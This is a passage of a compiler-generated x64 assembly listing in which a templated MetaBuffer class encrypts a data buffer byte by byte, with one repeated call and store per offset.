  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
